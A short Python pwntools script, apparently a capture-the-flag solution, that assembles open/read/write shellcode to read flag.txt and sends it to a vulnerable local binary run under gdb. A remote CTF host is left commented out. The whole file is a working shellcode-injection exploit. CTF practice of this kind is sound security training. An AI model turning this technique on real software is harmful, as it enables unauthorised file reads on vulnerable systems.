from pwn import *
context(arch='amd64', os='linux')

#p = remote('ctf.tcp1p.com', 8008)
#p = process('./vuln')
p = gdb.debug('./vuln', '''
b *main''')


file_name = 'flag.txt'
length = 32

shellcode = asm(
	shellcraft.open(file_name) +
	shellcraft.read('rax', 'rsp', length) +
	shellcraft.write(1, 'rsp', length))

print(p.recv())

p.sendline(shellcode)
p.interactive()
